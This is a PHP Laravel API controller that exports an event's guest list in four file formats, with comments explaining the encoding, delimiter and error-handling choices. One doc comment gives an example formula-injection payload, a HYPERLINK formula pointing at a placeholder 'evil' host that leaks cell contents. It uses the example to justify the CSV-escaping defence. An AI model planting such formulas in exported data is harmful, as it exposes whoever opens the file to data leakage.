<?php

namespace App\Http\Controllers\Api;

use App\Exceptions\ApiError;
use App\Http\Controllers\Controller;
use App\Models\Event;
use App\Support\GuestList;
use Dedoc\Scramble\Attributes\Group;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Response;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Writer\XLSX\Writer;
use Symfony\Component\HttpFoundation\StreamedResponse;

#[Group('Registration', weight: 40)]
class GuestListExportController extends Controller
{
    /**
     * Download the guest list as a file.
     *
     * Requires `registrations.view`. `{format}` is `xlsx`, `csv`, `md` or
     * `json`; any other value is a `404` from the router.
     *
     * Returns the list as an attachment named after the event: one row per
     * booking with the guest's details, a column for each of the event's
     * bookable options holding how many of it that booking took, the number
     * of people it covers, its total in francs and when it was made, then a
     * closing totals row for the caterer. Every format carries the same rows
     * in the same order.
     *
     * The CSV is semicolon-separated and carries a UTF-8 byte order mark, so
     * Excel opens it in columns and with accents intact.
     *
     * XLSX needs the PHP `zip` extension. A server without it answers
     * `503 xlsx_unavailable`, and CSV still works there.
     */
    public function __invoke(Event $event, string $format): Response|StreamedResponse|JsonResponse
    {
        // ONE ROW-BUILDER, FOUR FORMATTERS — see App\Support\GuestList. The
        // formats must not be able to disagree about what a guest list
        // contains, and a test asserts they do not.
        //
        // XLSX IS THE ONE THAT MATTERS, because a committee member opens the
        // file in Excel. CSV exists as the dependency-free fallback:
        // openspout needs ext-zip, and MEASURED 2026-09-10 that extension was
        // absent even from this project's own php:8.4-fpm image (now added in
        // docker/web/Dockerfile) and remains unverified on the shared host.
        // If it is missing there, this endpoint says so in words rather than
        // dying with "Class ZipArchive not found".
        //
        // Markdown is for pasting a list into notes or a message; JSON is the
        // same rows the screen already has, offered as a file for
        // completeness.
        $list = GuestList::for($event);

        return match ($format) {
            'xlsx' => $this->xlsx($list),
            'csv' => $this->csv($list),
            'md' => $this->markdown($list),
            'json' => $this->json($list),
            // Unreachable through the route, whose {format} is constrained —
            // kept so a widened constraint cannot silently fall through to a
            // 500.
            default => ApiError::json(404, 'not_found', 'Unknown export format'),
        };
    }

    private function xlsx(GuestList $list): JsonResponse|StreamedResponse
    {
        // A named refusal rather than a fatal. An operator reading this
        // knows exactly what to ask the host for, and CSV still works.
        if (! extension_loaded('zip')) {
            return ApiError::json(
                503,
                'xlsx_unavailable',
                'XLSX export needs the PHP zip extension, which this server does not have. Use CSV.',
            );
        }

        return response()->streamDownload(function () use ($list): void {
            $writer = new Writer;
            $writer->openToFile('php://output');

            $writer->addRow(Row::fromValues($list->headers()));
            foreach ($list->rows() as $row) {
                $writer->addRow(Row::fromValues($row));
            }
            $writer->addRow(Row::fromValues($list->totals()));

            $writer->close();
        }, $list->filename().'.xlsx', [
            'Content-Type' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        ]);
    }

    private function csv(GuestList $list): Response
    {
        $handle = fopen('php://temp', 'r+');

        // A UTF-8 BOM, deliberately. Excel on Windows reads a BOM-less UTF-8
        // CSV as the system codepage and renders every accent as mojibake —
        // "Répétition" becomes "RÃ©pÃ©tition" — which for a French guest list
        // full of names is the difference between a usable file and a
        // useless one.
        fwrite($handle, "\xEF\xBB\xBF");

        // Semicolons, not commas: Swiss and French Excel treat ';' as the
        // field separator, and a comma-delimited file opens as one column.
        fputcsv($handle, $list->headers(), ';');
        foreach ($list->rows() as $row) {
            fputcsv($handle, array_map(self::defuse(...), $row), ';');
        }
        fputcsv($handle, array_map(self::defuse(...), $list->totals()), ';');

        rewind($handle);
        $csv = (string) stream_get_contents($handle);
        fclose($handle);

        return response($csv, 200, [
            'Content-Type' => 'text/csv; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.csv"',
        ]);
    }

    /**
     * Stops Excel executing a guest's name.
     *
     * Every identity column in this file comes from the PUBLIC booking form
     * and is validated only as a string, so a booking under the name
     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula the moment
     * a committee member opens the CSV. Prefixing with an apostrophe makes
     * Excel treat the cell as text; the apostrophe itself is not displayed.
     *
     * CSV ONLY. The XLSX writer emits typed string cells that Excel does
     * not re-parse, and Markdown is not executed by anything. Applying it
     * more widely would put stray apostrophes in the other formats and
     * break the agreement between them that GuestList exists to guarantee.
     */
    private static function defuse(mixed $cell): mixed
    {
        if (! is_string($cell) || $cell === '') {
            return $cell;
        }

        return str_contains("=+-@\t\r", $cell[0]) ? "'".$cell : $cell;
    }

    private function markdown(GuestList $list): Response
    {
        $line = fn (array $cells): string => '| '.implode(' | ', array_map(
            fn ($cell): string => str_replace('|', '\\|', (string) ($cell ?? '')),
            $cells
        )).' |';

        $lines = [$line($list->headers())];
        $lines[] = '| '.implode(' | ', array_fill(0, count($list->headers()), '---')).' |';

        foreach ($list->rows() as $row) {
            $lines[] = $line($row);
        }
        $lines[] = $line($list->totals());

        return response(implode("\n", $lines)."\n", 200, [
            'Content-Type' => 'text/markdown; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.md"',
        ]);
    }

    private function json(GuestList $list): JsonResponse
    {
        return response()->json([
            'headers' => $list->headers(),
            'rows' => $list->rows(),
            'totals' => $list->totals(),
        ], 200, [
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.json"',
        ]);
    }
}
